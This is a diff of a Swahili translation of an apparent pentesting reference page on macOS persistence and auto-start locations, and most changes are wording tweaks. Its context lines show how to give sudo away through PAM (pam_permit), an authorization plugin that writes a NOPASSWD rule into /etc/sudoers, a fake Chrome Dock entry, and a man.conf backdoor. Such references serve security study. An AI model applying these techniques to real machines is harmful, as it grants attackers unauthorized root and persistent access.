@@ -784,7 +782,7 @@ Ili kufanya script hapo juu iweze kutumiwa na Matendo ya Folda, itaandikwa kwa k
 ```bash
 osacompile -l JavaScript -o folder.scpt source.js
 ```
-Baada ya script kuwa imekusanywa, weka Matendo ya Folda kwa kutekeleza script hapa chini. Script hii itawezesha Matendo ya Folda kwa ujumla na kuambatanisha script iliyokusanywa awali kwa folda ya Desktop.
+Baada ya script kuandaliwa, weka Vitendo vya Folda kwa kutekeleza script hapa chini. Script hii itawezesha Vitendo vya Folda kwa ujumla na kuambatanisha script iliyokwisha kuandaliwa awali kwenye folda ya Desktop.
 ```javascript
 // Enabling and attaching Folder Action
 var se = Application("System Events");
@@ -822,19 +820,19 @@ mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
 Kisha, fungua programu ya `Folder Actions Setup`, chagua **folda unayotaka kufuatilia** na chagua katika kesi yako **`folder.scpt`** (katika kesi yangu niliita output2.scp):
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>
 
 Sasa, ukifungua folda hiyo na **Finder**, script yako itatekelezwa.
 
-Mipangilio hii ilihifadhiwa katika **plist** iliyoko katika **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwa muundo wa base64.
+Mipangilio hii ilihifadhiwa katika **plist** iliyoko katika **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** katika muundo wa base64.
 
 Sasa, jaribu kuandaa uthabiti huu bila ufikiaji wa GUI:
 
 1. **Nakili `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwenda `/tmp` kwa kuihifadhi:
 * `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
-2. **Ondoa** Matendo ya Folda uliyoweka tu:
+2. **Ondoa** Matendo ya Folda uliyojiwekea tu:
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sasa tukiwa na mazingira yasiyo na kitu
 
@@ -845,9 +843,9 @@ Sasa tukiwa na mazingira yasiyo na kitu
 Na hii haikufanya kazi kwangu, lakini hizi ni maagizo kutoka kwa andiko hilo:(
 {% endhint %}
 
-### Vielekezo vya Dock
+### Viungo vya Dock
 
-Andiko: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)
+Andika: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)
 
 * Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
 * Lakini unahitaji kuwa umeweka programu mbaya ndani ya mfumo
@@ -856,13 +854,13 @@ Andiko: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.g
 #### Mahali
 
 * `~/Library/Preferences/com.apple.dock.plist`
-* **Kichocheo**: Wakati mtumiaji anapobonyeza programu ndani ya Dock
+* **Kichocheo**: Wakati mtumiaji anapobonyeza programu ndani ya dock
 
 #### Maelezo & Utekaji
 
 Programu zote zinazoonekana kwenye Dock zimetajwa ndani ya plist: **`~/Library/Preferences/com.apple.dock.plist`**
 
-Inawezekana kuongeza programu tu kwa:
+Inawezekana **kuongeza programu** tu kwa:
 
 {% code overflow="wrap" %}
 ```bash
@@ -874,7 +872,7 @@ killall Dock
 ```
 {% endcode %}
 
-Kwa kutumia **uhandisi wa kijamii** unaweza **kujifanya kuwa mfano wa Google Chrome** ndani ya dock na kisha kutekeleza script yako mwenyewe:
+Kwa kutumia **uchoraji wa kijamii** unaweza **kujifanya kuwa mfano Google Chrome** ndani ya dock na kisha kutekeleza script yako mwenyewe:
 ```bash
 #!/bin/sh
 
@@ -948,9 +946,9 @@ Maelezo: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.g
 
 **Kusanya kifurushi cha wachukuzi wa rangi** na nambari yako (unaweza kutumia [**huyu kwa mfano**](https://github.com/viktorstrate/color-picker-plus)) na ongeza konstrukta (kama katika [sehemu ya Skrini ya Kuficha](macos-auto-start-locations.md#screen-saver)) na nakili kifurushi kwa `~/Library/ColorPickers`.
 
-Kisha, wakati wachukuzi wa rangi unapochochewa, programu yako inapaswa kufanya vivyo hivyo.
+Kisha, wakati wachukuzi wa rangi unapochochewa, programu yako inapaswa kuwa pia.
 
-Tafadhali kumbuka kuwa binary inayopakia maktaba yako ina **mchanga wa kizuizi sana**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+Tafadhali kumbuka kuwa binary inayoingiza maktaba yako ina **mchanga wa kizuizi sana**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 
 {% code overflow="wrap" %}
 ```bash
@@ -963,7 +961,7 @@ Tafadhali kumbuka kuwa binary inayopakia maktaba yako ina **mchanga wa kizuizi s
 ```
 {% endcode %}
 
-### Vifaa vya Ufungaji wa Finder
+### Vifaa vya Kupambana na Finder
 
 **Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
 **Maelezo**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)
@@ -975,11 +973,11 @@ Tafadhali kumbuka kuwa binary inayopakia maktaba yako ina **mchanga wa kizuizi s
 
 * Programu maalum
 
-#### Maelezo & Kudukua
+#### Maelezo & Utekaji
 
-Mfano wa programu na Kifaa cha Ufungaji wa Finder [**unaweza kupatikana hapa**](https://github.com/D00MFist/InSync).
+Mfano wa programu na Kifaa cha Kupambana na Finder [**unaweza kupatikana hapa**](https://github.com/D00MFist/InSync).
 
-Programu zinaweza kuwa na `Vifaa vya Ufungaji wa Finder`. Kifaa hiki kitawekwa ndani ya programu ambayo itatekelezwa. Zaidi ya hayo, ili kifaa hicho kiweze kutekeleza nambari yake lazima iwe **imesainiwa** na cheti halali cha msanidi programu wa Apple, lazima iwe **imesandukwa** (ingawa kuna maelewano yaliyorekebishwa yanaweza kuongezwa) na lazima iwe imeandikishwa na kitu kama:
+Programu zinaweza kuwa na `Vifaa vya Kupambana na Finder`. Kifaa hiki kitawekwa ndani ya programu ambayo itatekelezwa. Zaidi ya hayo, ili kifaa hicho kiweze kutekeleza nambari yake lazima **iwe imesainiwa** na cheti halali cha msanidi programu wa Apple, lazima iwe **imesandukwa** (ingawa kuna maelewano yaliyorekebishwa yanaweza kuongezwa) na lazima iwe imeandikishwa na kitu kama:
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
@@ -996,21 +994,21 @@ Maelezo: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://p
 #### Mahali
 
 * `/System/Library/Screen Savers`
-* Inahitaji ruhusa ya msingi
+* Inahitaji mizizi
 * **Kichocheo**: Chagua skrini ya kupumzika
 * `/Library/Screen Savers`
-* Inahitaji ruhusa ya msingi
+* Inahitaji mizizi
 * **Kichocheo**: Chagua skrini ya kupumzika
 * `~/Library/Screen Savers`
 * **Kichocheo**: Chagua skrini ya kupumzika
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
 
-#### Maelezo & Shambulio
+#### Maelezo & Kudukua
 
-Unda mradi mpya katika Xcode na chagua kiolezo cha kuzalisha **Screen Saver** mpya. Kisha, weka kanuni yako, kwa mfano kanuni ifuatayo ya kuzalisha magogo.
+Unda mradi mpya katika Xcode na chagua kiolezo cha kuzalisha **Screen Saver** mpya. Kisha, weka kanuni yako, kwa mfano kanuni ifuatayo kuzalisha magogo.
 
-**Jenga** hiyo, na nakili pakiti ya `.saver` kwa **`~/Library/Screen Savers`**. Kisha, fungua GUI ya Skrini ya Kupumzika na ikiwa tu unabonyeza juu yake, inapaswa kuzalisha magogo mengi:
+**Jenga** hiyo, na nakili kifurushi cha `.saver` kwa **`~/Library/Screen Savers`**. Kisha, fungua GUI ya Skrini ya Kupumzika na ikiwa tu unabonyeza juu yake, inapaswa kuzalisha magogo mengi:
 
 {% code overflow="wrap" %}
 ```bash
@@ -1100,7 +1098,7 @@ maandishi: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbi
 * Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
 * Lakini utamaliza katika sanduku la programu
 * Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)
-* Sanduku la mchanga linaonekana kuwa na mipaka sana
+* Sanduku la mchanga linaonekana kuwa na kikomo kikubwa
 
 #### Mahali
 
@@ -1108,24 +1106,24 @@ maandishi: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbi
 * **Kichocheo**: Faili mpya yenye kificho kinachosimamiwa na kifaa cha Spotlight inaundwa.
 * `/Library/Spotlight/`
 * **Kichocheo**: Faili mpya yenye kificho kinachosimamiwa na kifaa cha Spotlight inaundwa.
-* Inahitajika kuwa na mizizi
+* Inahitaji mizizi
 * `/System/Library/Spotlight/`
 * **Kichocheo**: Faili mpya yenye kificho kinachosimamiwa na kifaa cha Spotlight inaundwa.
-* Inahitajika kuwa na mizizi
+* Inahitaji mizizi
 * `Some.app/Contents/Library/Spotlight/`
 * **Kichocheo**: Faili mpya yenye kificho kinachosimamiwa na kifaa cha Spotlight inaundwa.
 * Programu mpya inahitajika
 
-#### Maelezo na Utekaji
+#### Maelezo & Utekaji
 
 Spotlight ni kipengele cha utaftaji kilichojengwa ndani ya macOS, kimeundwa kutoa watumiaji na **upatikanaji wa haraka na wa kina wa data kwenye kompyuta zao**.\
 Ili kurahisisha uwezo huu wa utaftaji wa haraka, Spotlight inaendeleza **hifadhidata ya kipekee** na kuunda indeksi kwa **kuchambua faili nyingi**, kuruhusu utaftaji wa haraka kupitia majina ya faili na maudhui yao.
 
-Mfumo wa msingi wa Spotlight unajumuisha mchakato wa kati unaoitwa 'mds', ambao unamaanisha **'metadata server'**. Mchakato huu unaratibu huduma nzima ya Spotlight. Kama nyongeza, kuna 'mdworker' daemons kadhaa ambao hutekeleza majukumu mbalimbali ya matengenezo, kama vile kuunda indeksi za aina tofauti za faili (`ps -ef | grep mdworker`). Majukumu haya yanawezekana kupitia vifaa vya kuingiza vya Spotlight, au **"mabandiko ya .mdimporter"**, ambayo huwezesha Spotlight kuelewa na kuunda indeksi ya maudhui katika anuwai ya muundo wa faili.
+Mfumo wa msingi wa Spotlight unajumuisha mchakato wa kati unaoitwa 'mds', ambao unamaanisha **'metadata server'**. Mchakato huu unaratibu huduma nzima ya Spotlight. Kando na hilo, kuna 'mdworker' daemons kadhaa ambao hutekeleza majukumu mbalimbali ya matengenezo, kama vile kuunda indeksi za aina tofauti za faili (`ps -ef | grep mdworker`). Majukumu haya yanawezekana kupitia vifaa vya kuingiza Spotlight, au **"mabandiko ya .mdimporter"**, ambayo huwezesha Spotlight kuelewa na kuunda indeksi ya maudhui katika anuwai ya muundo wa faili.
 
-Vifaa au **mabandiko ya .mdimporter** yako katika maeneo yaliyotajwa hapo awali na ikiwa mabandiko mapya yanaonekana yanapakiwa ndani ya dakika (hakuna haja ya kuanzisha upya huduma yoyote). Mabandiko haya lazima yaeleze ni **aina gani ya faili na nyongeza wanaweza kusimamia**, kwa njia hii, Spotlight itawatumia wakati faili mpya yenye nyongeza iliyotajwa inapoundwa.
+Vifaa au **mabandiko ya `.mdimporter`** yapo katika maeneo yaliyotajwa hapo awali na ikiwa mabandiko mapya yataonekana yanaingizwa ndani ya dakika (hakuna haja ya kuanzisha upya huduma yoyote). Mabandiko haya lazima yaeleze ni **aina gani ya faili na vificho wanavyoweza kusimamia**, kwa njia hii, Spotlight itavitumia wakati faili mpya yenye kificho kilichotajwa inapoundwa.
 
-Inawezekana **kupata `mdimporters` zote** zilizopakiwa kwa kukimbia:
+Inawezekana **kupata `mdimporters` zote** zilizoingizwa kwa kukimbia:
 ```bash
 mdimport -L
 Paths: id(501) (
@@ -1173,13 +1171,13 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 {% hint style="danger" %}
 Ikiwa utachunguza Plist ya `mdimporter` nyingine, huenda usipate kuingia **`UTTypeConformsTo`**. Hii ni kwa sababu ni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) iliyojengwa ndani na haitaji kutaja nyongeza.
 
-Zaidi ya hayo, programu-jalizi za mfumo wa msingi daima zinapewa kipaumbele, hivyo mshambuliaji anaweza kupata ufikivu kwenye faili ambazo vinginevyo hazijachambuliwa na `mdimporters` za Apple.
+Zaidi ya hayo, programu-jalizi za mfumo wa chaguo-msingi daima zinapewa kipaumbele, hivyo mshambuliaji anaweza kupata ufikivu tu kwa faili ambazo vinginevyo hazijachambuliwa na `mdimporters` za Apple.
 {% endhint %}
 
-Ili kuunda chombo chako cha kuingiza unaweza kuanza na mradi huu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) na kisha badilisha jina, **`CFBundleDocumentTypes`** na ongeza **`UTImportedTypeDeclarations`** ili iweze kusaidia nyongeza unayotaka kusaidia na uirejeshe kwenye **`schema.xml`**.\
+Ili kuunda chombo chako cha kuingiza unaweza kuanza na mradi huu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) na kisha badilisha jina, **`CFBundleDocumentTypes`** na ongeza **`UTImportedTypeDeclarations`** ili iweze kusaidia nyongeza unayotaka kusaidia na uwaonyeshe katika **`schema.xml`**.\
 Kisha **badilisha** nambari ya kazi **`GetMetadataForFile`** ili kutekeleza mzigo wako wakati faili yenye nyongeza iliyosindika inapoundwa.
 
-Hatimaye **jenga na nakili chombo chako kipya cha `.mdimporter`** kwenye moja ya maeneo yaliyotajwa hapo awali na unaweza kuangalia wakati wowote inapopakiwa **kwa kufuatilia magogo** au kwa kuangalia **`mdimport -L.`**
+Hatimaye **jenga na nakili chombo chako kipya cha `.mdimporter`** kwa moja ya maeneo yaliyotajwa hapo awali na unaweza kuangalia wakati wowote inapopakiwa **kwa kufuatilia magogo** au kwa kuangalia **`mdimport -L.`**
 
 ### ~~Pane ya Mapendeleo~~
 
@@ -1206,10 +1204,10 @@ Haionekani kama hii inafanya kazi tena.
 ## Kizuizi cha Mchanga cha Mzizi
 
 {% hint style="success" %}
-Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **kuzidi kizuizi cha sanduku** ambacho kinakuruhusu tu kutekeleza kitu kwa **kuandika kwenye faili** ukiwa **mzizi** na/au kuhitaji **hali nyingine za ajabu.**
+Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **kizuizi cha mchanga** kinachokuwezesha kutekeleza kitu kwa **kuandika kwenye faili** ukiwa **mzizi** na/au kuhitaji **hali nyingine za ajabu.**
 {% endhint %}
 
-### Maradufu
+### Kipindi
 
 Maelezo: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)
 
@@ -1228,7 +1226,7 @@ Maelezo: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.
 
 #### Maelezo & Utekaji
 
-Skripti za maradufu (**`/etc/periodic`**) zinatekelezwa kwa sababu ya **daemons za uzinduzi** zilizowekwa katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Tafadhali kumbuka kuwa skripti zilizohifadhiwa katika `/etc/periodic/` zinatekelezwa kama **mmiliki wa faili,** hivyo haitafanya kazi kwa kubadilisha haki za mamlaka.
+Skripti za kipindi (**`/etc/periodic`**) zinatekelezwa kwa sababu ya **daemons za kuanzisha** zilizowekwa katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Tafadhali kumbuka kuwa skripti zilizohifadhiwa katika `/etc/periodic/` zinatekelezwa kama **mmiliki wa faili,** hivyo haitafanya kazi kwa kupandisha hadhi ya mamlaka.
 ```bash
 # Launch daemons that will execute the periodic scripts
 ls -l /System/Library/LaunchDaemons/com.apple.periodic*
@@ -1269,7 +1267,7 @@ monthly_local="/etc/monthly.local"			# Local scripts
 Ikiwa utafanikiwa kuandika faili yoyote kati ya `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local` itakuwa **kutekelezwa mapema au baadaye**.
 
 {% hint style="warning" %}
-Tafadhali kumbuka kwamba script ya kipindi itatekelezwa kama **mmiliki wa script**. Kwa hivyo ikiwa mtumiaji wa kawaida anamiliki script, itatekelezwa kama mtumiaji huyo (hii inaweza kuzuia mashambulizi ya upeo wa mamlaka).
+Tafadhali kumbuka kwamba script ya kipindi itatekelezwa kama **mmiliki wa script**. Kwa hivyo, ikiwa mtumiaji wa kawaida anamiliki script, itatekelezwa kama mtumiaji huyo (hii inaweza kuzuia mashambulizi ya uongezaji wa mamlaka).
 {% endhint %}
 
 ### PAM
@@ -1277,15 +1275,15 @@ Tafadhali kumbuka kwamba script ya kipindi itatekelezwa kama **mmiliki wa script
 Maelezo: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
 Maelezo: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)
 
-* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
-* Lakini unahitaji kuwa na ruhusa ya mizizi
-* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)
+* Inatumika kwa kudanganya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+* Lakini unahitaji kuwa na ruhusa ya mizizi (root)
+* Kudanganya TCC: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Mahali
 
-* Mizizi inahitajika daima
+* Mizizi (root) inahitajika daima
 
-#### Maelezo & Utekaji
+#### Maelezo na Utekaji
 
 Kwa kuwa PAM inazingatia zaidi **upenyezaji** na zisizo za virusi ndani ya macOS, blogi hii haitatoa maelezo ya kina, **soma maelezo ili kuelewa mbinu hii vizuri**.
 
@@ -1293,7 +1291,7 @@ Angalia moduli za PAM na:
 ```bash
 ls -l /etc/pam.d
 ```
-### Kitekniki ya kudumu/kuongeza mamlaka kwa kutumia PAM ni rahisi kama kuhariri moduli /etc/pam.d/sudo kwa kuongeza kwenye mwanzo mstari:
+Mbinu ya uthabiti/kuongeza mamlaka ikidhulumu PAM ni rahisi kama kubadilisha moduli /etc/pam.d/sudo kwa kuongeza mwanzoni mstari:
 ```bash
 auth       sufficient     pam_permit.so
 ```
@@ -1311,7 +1309,7 @@ session    required       pam_permit.so
 Na kwa hivyo jaribio lolote la kutumia **`sudo` litafanya kazi**.
 
 {% hint style="danger" %}
-Tafadhali elewa kuwa saraka hii inalindwa na TCC hivyo ni uwezekano mkubwa kwamba mtumiaji atapata ombi la kupata ruhusa.
+Tafadhali elewa kuwa saraka hii inalindwa na TCC hivyo ni uwezekano mkubwa kwamba mtumiaji atapata ombi la kupewa ruhusa.
 {% endhint %}
 
 ### Vifaa vya Kuidhinisha
@@ -1331,7 +1329,7 @@ Maelezo: [https://posts.specterops.io/persistent-credential-theft-with-authoriza
 
 #### Maelezo & Utekaji
 
-Unaweza kuunda programu-jalizi ya kuidhinisha ambayo itatekelezwa wakati mtumiaji anapoingia ili kudumisha uthabiti. Kwa maelezo zaidi kuhusu jinsi ya kuunda moja ya programu-jalizi hizi angalia maelezo ya awali (na uwe mwangalifu, moja isiyoundwa vizuri inaweza kukufunga nje na utahitaji kusafisha mac yako kutoka kwa hali ya kupona).
+Unaweza kuunda programu-jalizi ya kuidhinisha ambayo itatekelezwa wakati mtumiaji anapoingia ili kudumisha uthabiti. Kwa maelezo zaidi kuhusu jinsi ya kuunda moja ya programu-jalizi hizi angalia maelezo ya awali (na uwe mwangalifu, moja isiyoundwa vizuri inaweza kukufunga nje na utahitaji kusafisha Mac yako kutoka kwa hali ya kupona).
 ```objectivec
 // Compile the code and create a real bundle
 // gcc -bundle -framework Foundation main.m -o CustomAuth
@@ -1346,7 +1344,7 @@ NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
 system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
 }
 ```
-**Hamisha** mfungu wa programu kwenye eneo litakalopakiwa:
+**Hamisha** kifurushi hadi eneo litakalopakiwa:
 ```bash
 cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
 ```
@@ -1379,27 +1377,27 @@ Na kisha **kikundi cha wafanyakazi kinapaswa kuwa na upatikanaji wa sudo** (soma
 
 ### Man.conf
 
-Maelezo: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)
+Andika: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)
 
-* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
+* Inatumika kwa kuzidi sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 * Lakini unahitaji kuwa na mizizi na mtumiaji lazima tumie man
-* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)
+* Kuzidi TCC: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Mahali
 
 * **`/private/etc/man.conf`**
 * Inahitaji mizizi
-* **`/private/etc/man.conf`**: Kila wakati man inapotumiwa
+* **`/private/etc/man.conf`**: Wakati wowote man inapotumiwa
 
 #### Maelezo & Kudukua
 
-Faili ya usanidi **`/private/etc/man.conf`** inaonyesha faili ya hati ya kufungua. Kwa hivyo njia ya kutekelezeka inaweza kubadilishwa ili kila wakati mtumiaji anapotumia man kusoma baadhi ya hati, mlango wa nyuma unatekelezwa.
+Faili ya usanidi **`/private/etc/man.conf`** inaonyesha binary/script ya kutumia wakati wa kufungua faili za nyaraka za man. Kwa hivyo njia ya kutekelezeka inaweza kubadilishwa ili wakati wowote mtumiaji anatumia man kusoma nyaraka fulani, mlango wa nyuma unatekelezwa.
 
 Kwa mfano weka katika **`/private/etc/man.conf`**:
 ```
 MANPAGER /tmp/view
 ```
-Na kisha unda `/tmp/view` kama:
+Na kisha tengeneza `/tmp/view` kama:
 ```bash
 #!/bin/zsh
 
@@ -1450,7 +1448,7 @@ printf("[+] dylib constructor called from %s\n", argv[0]);
 syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
 }
 ```
-### Kitengo cha ukaguzi wa BSM
+### Kitengo cha ukaguzi wa mfumo wa BSM
 
 Maelezo: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)
 
@@ -1481,9 +1479,12 @@ Unaweza kulazimisha onyo kwa kutumia `sudo audit -n`.
 **StartupItem** ni folda ambayo inapaswa kuwekwa ndani ya `/Library/StartupItems/` au `/System/Library/StartupItems/`. Mara baada ya folda hii kuwekwa, lazima iwe na faili mbili maalum:
 
 1. **rc script**: Script ya shell inayotekelezwa wakati wa kuanza.
-2. Faili ya **plist**, iitwayo `StartupParameters.plist`, ambayo ina mipangilio mbalimbali.
+2. Faili ya **plist**, iitwayo `StartupParameters.plist`, ambayo ina mazingira mbalimbali ya usanidi.
 
 Hakikisha kwamba script ya rc na faili ya `StartupParameters.plist` zimewekwa kwa usahihi ndani ya folda ya **StartupItem** ili mchakato wa kuanza uweze kuzitambua na kuzitumia.
+
+{% tabs %}
+{% tab title="StartupParameters.plist" %}
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -1534,7 +1535,7 @@ Andiko: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.g
 
 Kuletwa na Apple, **emond** ni mfumo wa kuingiza taarifa ambao unaonekana kutokuwa umekamilika au labda umeachwa, lakini bado unapatikana. Ingawa sio muhimu sana kwa msimamizi wa Mac, huduma hii isiyoeleweka inaweza kutumika kama njia ya kudumu kwa wahalifu wa mtandao, labda bila kugunduliwa na wengi wa wasimamizi wa macOS.
 
-Kwa wale wanaofahamu uwepo wake, kutambua matumizi mabaya yoyote ya **emond** ni rahisi. LaunchDaemon ya mfumo kwa huduma hii inatafuta hati za kutekelezwa kwenye saraka moja. Ili kuangalia hili, unaweza kutumia amri ifuatayo:
+Kwa wale wanaofahamu uwepo wake, kutambua matumizi mabaya ya **emond** ni rahisi. LaunchDaemon ya mfumo kwa huduma hii inatafuta hati za kutekelezwa kwenye saraka moja. Ili kuangalia hili, unaweza kutumia amri ifuatayo:
 ```bash
 ls -l /private/var/db/emondClients
 ```
@@ -1555,7 +1556,7 @@ XQuartz **haipo tena imewekwa kwenye macOS**, hivyo ikiwa unataka maelezo zaidi 
 ### ~~kext~~
 
 {% hint style="danger" %}
-Ni ngumu sana kusakinisha kext hata kama mizizi hivyo sitazingatia hii kutoroka kutoka kwa mchanga au hata kwa uthabiti (isipokuwa una shambulio)
+Ni ngumu sana kusakinisha kext hata kama mizizi hivyo sitazingatia hii kutoroka kutoka kwa mchanga au hata kwa uthabiti (isipokuwa una shambulizi)
 {% endhint %}
 
 #### Mahali
@@ -1567,7 +1568,7 @@ Ili kusakinisha KEXT kama kipengee cha kuanza, inahitaji **kusakinishwa kwenye m
 * `/Library/Extensions`
 * Faili za KEXT zilizosakinishwa na programu ya tatu
 
-Unaweza kuorodhesha faili za kext zilizosakinishwa kwa sasa kwa:
+Unaweza orodha ya sasa ya faili za kext zilizosakinishwa na:
 ```bash
 kextstat #List loaded kext
 kextload /path/to/kext.kext #Load a new one based on path
@@ -1588,9 +1589,9 @@ Maelezo: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.
 
 #### Maelezo & Utekaji
 
-Inaonekana kwamba `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa ikitumia binary hii wakati inafunua huduma ya XPC... swala ni kwamba binary haikuwepo, hivyo ungeweza kuweka kitu hapo na wakati huduma ya XPC inaitwa binary yako itaitwa.
+Inaonekana kwamba `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa inatumia binary hii wakati inafunua huduma ya XPC... swala ni kwamba binary haikuwepo, hivyo ungeweza kuweka kitu pale na wakati huduma ya XPC inaitwa binary yako itaitwa.
 
-Sioni tena hii kwenye macOS yangu.
+Sikuweza tena kupata hii kwenye macOS yangu.
 
 ### ~~xsanctl~~
 
@@ -1602,9 +1603,9 @@ Maelezo: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.
 * Inahitaji ruhusa ya Root
 * **Kichocheo**: Wakati huduma inapoendeshwa (kwa nadra)
 
-#### Maelezo & utekaji
+#### Maelezo & Utekaji
 
-Inaonekana sio kawaida sana kuendesha skripti hii na sikuweza hata kuipata kwenye macOS yangu, hivyo kama unataka maelezo zaidi angalia maelezo.
+Inaonekana sio kawaida kutekeleza script hii na sikuweza hata kuipata kwenye macOS yangu, hivyo kama unataka maelezo zaidi angalia maelezo.
 
 ### ~~/etc/rc.common~~
 
@@ -1612,7 +1613,7 @@ Inaonekana sio kawaida sana kuendesha skripti hii na sikuweza hata kuipata kweny
 **Hii haifanyi kazi katika toleo za kisasa za MacOS**
 {% endhint %}
 
-Pia niwezekano wa kuweka hapa **maagizo ambayo yataendeshwa wakati wa kuanza.** Mfano wa skripti ya kawaida ya rc.common:
+Pia niwezekano wa kuweka hapa **maagizo ambayo yataendeshwa wakati wa kuanza.** Mfano wa script ya kawaida ya rc.common:
 ```bash
 #
 # Common setup for startup scripts.
